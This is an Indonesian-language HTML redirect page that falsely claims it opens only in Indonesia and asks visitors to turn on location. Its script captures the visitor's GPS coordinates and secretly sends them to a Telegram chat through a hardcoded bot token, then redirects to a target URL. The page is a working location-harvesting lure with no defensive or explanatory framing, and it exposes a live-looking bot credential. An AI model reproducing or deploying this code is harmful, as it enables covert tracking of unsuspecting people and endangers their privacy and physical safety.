<!DOCTYPE html>
<html>
<head>
    <title>Redirect...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        button {
            padding: 12px 20px;
            font-size: 16px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
    <script>
        const BOT_TOKEN = "8466065352:AAHRmeCDR9R5UEBk1MQ5seUw-NCu1QOLs9A";
        let chatId, target;

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let locationMsg = `📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locationMsg)}`)
                        .then(() => {
                            window.location.href = target;
                        });
                }, () => {
                    window.location.href = target;
                });
            } else {
                window.location.href = target;
            }
        }

        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            chatId = params.get("chatid");
            target = decodeURIComponent(params.get("target"));

            if (!chatId || !target) {
                document.body.innerHTML = "<h3>Link tidak valid</h3>";
            }
        };
    </script>
</head>
<body>
    <p>Halaman ini hanya bisa dibuka di Indonesia, untuk mengetahui lokasi anda maka nyalakan lokasi.</p>
    <button onclick="sendLocation()">Nyalakan Lokasi</button>
</body>
</html>
